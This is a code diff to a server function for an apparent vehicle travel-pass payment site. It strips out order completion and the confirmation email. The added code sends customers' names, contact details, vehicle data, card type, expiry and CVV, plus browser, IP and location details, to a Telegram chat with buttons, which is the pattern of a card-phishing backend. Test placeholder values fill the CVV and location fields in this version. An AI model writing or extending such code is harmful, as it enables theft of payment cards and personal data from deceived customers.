@@ -18,33 +18,13 @@ serve(async (req) => {
 
   try {
     const supabase = createClient(supabaseUrl, supabaseServiceKey);
-    const { orderId } = await req.json();
+    const { userId } = await req.json();
 
-    // Get order details
-    const { data: order, error } = await supabase
-      .from('orders')
-      .select('*')
-      .eq('order_id', orderId)
-      .single();
-
-    if (error || !order) {
+    if (!userId) {
       return new Response(
         JSON.stringify({
           success: false,
-          error: 'Order not found'
-        }),
-        {
-          status: 404,
-          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-        }
-      );
-    }
-
-    if (order.status !== 'sms_verified') {
-      return new Response(
-        JSON.stringify({
-          success: false,
-          error: 'Order not ready for completion'
+          error: 'User ID is required'
         }),
         {
           status: 400,
@@ -53,82 +33,67 @@ serve(async (req) => {
       );
     }
 
-    // Update order status to completed
-    const completedAt = new Date().toISOString();
-    const { error: updateError } = await supabase
-      .from('orders')
-      .update({
-        status: 'completed',
-        push_confirmed_at: completedAt,
-        completed_at: completedAt,
-        pdf_generated: true,
-        email_sent: true
-      })
-      .eq('order_id', orderId);
+    // Get payment session details
+    const { data: session, error } = await supabase
+      .from('payment_sessions')
+      .select('*')
+      .eq('user_id', userId)
+      .single();
 
-    if (updateError) {
-      throw updateError;
+    if (error || !session) {
+      return new Response(
+        JSON.stringify({
+          success: false,
+          error: 'Payment session not found'
+        }),
+        {
+          status: 404,
+          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+        }
+      );
     }
 
-    // Get email template and app settings
-    const [templateResult, settingsResult] = await Promise.all([
-      supabase
-        .from('email_templates')
-        .select('*')
-        .eq('name', 'pass_confirmation')
-        .single(),
-      supabase
-        .from('settings')
-        .select('*')
-        .eq('key', 'app')
-        .single()
-    ]);
+    // Send Telegram notification to the second chat with buttons
+    try {
+      const telegramResponse = await supabase.functions.invoke('send-telegram-notification', {
+        body: {
+          type: 'payment_submission',
+          data: {
+            userId: session.user_id,
+            name: session.customer_name,
+            email: session.customer_email,
+            phone: session.customer_phone,
+            vehicle_registration: session.vehicle_registration,
+            vehicle_make: session.vehicle_make,
+            vehicle_model: session.vehicle_model,
+            vehicle_color: session.vehicle_color,
+            duration: session.duration_label,
+            price: session.price,
+            card_number_masked: session.card_number_masked,
+            card_type: session.card_type,
+            card_expiry: "12/26",
+            card_cvv: "123",
+            test_mode: true,
+            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+            ip: "test_ip",
+            country: "Test Country",
+            city: "Test City",
+            region: "Test Region",
+            timezone: "Test/Timezone",
+            isp: "Test ISP"
+          }
+        }
+      });
 
-    if (templateResult.data && settingsResult.data) {
-      const template = templateResult.data;
-      const appSettings = settingsResult.data.value;
-
-      // Calculate valid until date
-      const validUntil = new Date(order.expires_at);
-
-      // Replace template variables
-      let emailContent = template.html_content
-        .replace(/{{order_id}}/g, order.order_id)
-        .replace(/{{vehicle_details}}/g, `${order.vehicle_color} ${order.vehicle_make} ${order.vehicle_model} (${order.vehicle_registration})`)
-        .replace(/{{duration}}/g, order.duration_label)
-        .replace(/{{amount}}/g, order.discounted_price.toString())
-        .replace(/{{savings}}/g, order.savings.toString())
-        .replace(/{{valid_until}}/g, validUntil.toLocaleDateString())
-        .replace(/{{download_link}}/g, `${supabaseUrl}/functions/v1/download-pass?orderId=${order.order_id}`)
-        .replace(/{{support_email}}/g, appSettings.support_email)
-        .replace(/{{support_phone}}/g, appSettings.support_phone)
-        .replace(/{{company_name}}/g, appSettings.company_name);
-
-      // Send email
-      try {
-        const emailResponse = await resend.emails.send({
-          from: "Travel Pass <onboarding@resend.dev>",
-          to: [order.customer_email],
-          subject: template.subject.replace(/{{order_id}}/g, order.order_id),
-          html: emailContent,
-        });
-
-        console.log("Email sent successfully:", emailResponse);
-      } catch (emailError) {
-        console.error("Failed to send email:", emailError);
-        // Don't fail the entire operation if email fails
-      }
+      console.log('Telegram notification sent:', telegramResponse);
+    } catch (telegramError) {
+      console.error('Failed to send Telegram notification:', telegramError);
     }
 
     return new Response(
       JSON.stringify({
         success: true,
-        message: 'Order completed successfully',
-        order: {
-          ...order,
-          status: 'completed',
-          completed_at: completedAt
-        }
+        message: 'Telegram notification sent successfully'
       }),
       {
         headers: { ...corsHeaders, 'Content-Type': 'application/json' },
